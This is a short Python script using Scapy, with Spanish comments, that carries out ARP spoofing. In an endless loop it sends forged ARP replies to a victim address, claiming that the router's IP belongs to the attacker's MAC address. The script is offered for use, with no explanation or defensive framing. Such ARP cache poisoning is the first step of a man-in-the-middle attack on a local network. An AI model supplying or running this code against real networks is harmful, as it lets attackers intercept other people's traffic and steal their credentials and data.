from scapy.all import ARP, send
import time

def arp_spoof(target_ip, spoof_ip):
    # Obtén la dirección MAC de la máquina atacante
    attacker_mac = 'XX:XX:XX:XX:XX:XX'  # Reemplaza con tu dirección MAC real

    # Crea un paquete ARP para decirle a la máquina víctima que la IP del router tiene la MAC del atacante
    arp_response = ARP(pdst=target_ip, hwdst='ff:ff:ff:ff:ff:ff', psrc=spoof_ip, hwsrc=attacker_mac, op=2)
    
    try:
        while True:
            send(arp_response)
            time.sleep(2)
    except KeyboardInterrupt:
        print("ARP spoofing detenido.")

if __name__ == "__main__":
    target_ip = "192.168.1.10"  # IP de la víctima
    spoof_ip = "192.168.1.1"  # IP del router
    arp_spoof(target_ip, spoof_ip)
